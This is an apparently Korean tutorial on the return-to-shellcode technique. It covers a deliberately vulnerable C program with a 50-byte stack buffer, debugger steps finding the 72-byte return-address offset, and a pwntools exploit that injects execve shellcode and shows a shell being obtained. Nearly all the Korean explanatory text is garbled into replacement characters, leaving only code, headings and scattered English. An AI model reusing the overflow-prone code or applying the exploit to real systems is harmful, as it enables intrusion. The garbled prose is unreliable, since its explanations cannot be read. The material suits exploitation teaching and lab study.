<h1>Return to Shellcode</h1>
Return to Shellcode�� Return address ������ Shellcode�� ����� �ּҷ� �����ؼ� Shellcode�� ȣ���ϴ� ���̴�.

<h3>Call & Ret instruction</h3>
call : Return address�� stack�� �����ϰ�, �ǿ����� �ּҷ� �̵�
ret  : POP�� �̿��� RSP�� ����Ű�� Stack�� ����� ���� RIP�� ����, �׸��� �� �� �ش� �ּҷ� �̵�

![image](https://user-images.githubusercontent.com/62539341/82208408-6cc79100-9946-11ea-9878-dd10eeb74fe8.png)

<h3>Permissions in memory</h3>

- r(read)   : �޸� ������ ���� �б�
- w(write)  : �޸� ������ ���� ����
- x(excute) : �޸� �������� �ڵ带 ����

<b>��, Shellcode�� �����ϱ� ���ؼ�? excute ������ �־�� �Ѵ�!</b>

gcc�� �⺻������ DEP�� ����Ǵµ�, �̰��� �ڵ尡 ����� �������� excute ������ �ְ�, �����Ͱ� ����Ǵ� �������� excute ������ ����.<br>
���� gcc �ɼ����� "-z execstack"�� �߰��ϸ� �ȴ�.

<h3>Proof of concept</h3>

```cpp
#include <stdio.h>
#include <unistd.h>
 
void vuln(){
    char buf[50];
    printf("buf[50] address : %p\n",buf);
    read(0, buf, 100);
}
 
void main(){
    vuln();
}
```
main()�Լ��� vuln() �Լ��� ȣ��, vuln() �Լ��� ����ڷκ��� 100���� ���ڸ� �Է¹޴´�.<br>
�̶�! buf ������ ũ��� 50 byte. ���� Stack Overflow�� �߻��Ѵ�.

- break point�� �̷��� �� ���̴�.
1. 0x400566 : vuln �Լ��� ù��° ��ɾ�
2. 0x400595 : read() �Լ� ȣ��
3. 0x40059c : vuln() �Լ��� ret ��ɾ�

![image](https://user-images.githubusercontent.com/62539341/82209017-8ae1c100-9947-11ea-8063-d42dbf2faf0d.png)

- Return address �� Ȯ��
  - rsp �� ����Ű�� �ֻ��� Stack �޸𸮴� 0x7fffffffe448
  - �� �޸𸮿� vuln() �Լ��� ����ǰ� �� �� ���ư� �ּ� ��(0x4005ab)�� ����Ǿ� �ִ�.

![image](https://user-images.githubusercontent.com/62539341/82210295-bebde600-9949-11ea-839f-5427f218d1c9.png)

- buf ������ �ּ� Ȯ��
  - buf ������ ��ġ�� 0x7fffffffe400 �̰�, Return address ��ġ�� 72 byte ������ �ִ�.
  - ��, ����ڰ� ���ڸ� 72�� �̻� �Է��ϸ�, Return address�� ��� �� �ִ�.

  ![image](https://user-images.githubusercontent.com/62539341/82210550-44419600-994a-11ea-9585-8cd3d2a9bca0.png)

- Return address ���� ����
  - 0x7fffffffe448 �� 0x4a4a4a4a4a4a4a4a(JJJJJJJJ)�� ����Ǿ� �ִ�.
  - ��, 72���� ���ڸ� �Է� �� shellcode�� ����� �ּҸ� �����ϸ� Return address�� ���� �� �� �ֽ��ϴ�.

![image](https://user-images.githubusercontent.com/62539341/82210666-705d1700-994a-11ea-90e4-9e1153be378f.png)

<h3>Exploit</h3>

- Exploit code �� �ۼ�

```py
from pwn import *
 
p = process('./poc')
p.recvuntil('buf[50] address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)
 
exploit = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
exploit += "\x90" * (72 - len(exploit))
exploit += p64(stackAddr)
p.send(exploit)
p.interactive()
```

- Exploit code�� �����ؼ� shell�� ȹ��

```
lazenca0x0@ubuntu:~/Exploit/shellcode$ python exploit.py
[+] Starting local process './test': pid 111702
[*] Switching to interactive mode
$ id
uid=1000(lazenca0x0) gid=1000(lazenca0x0) groups=1000(lazenca0x0),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$
```

��ó : http://lazenca.net/display/TEC/02.Return+to+Shellcode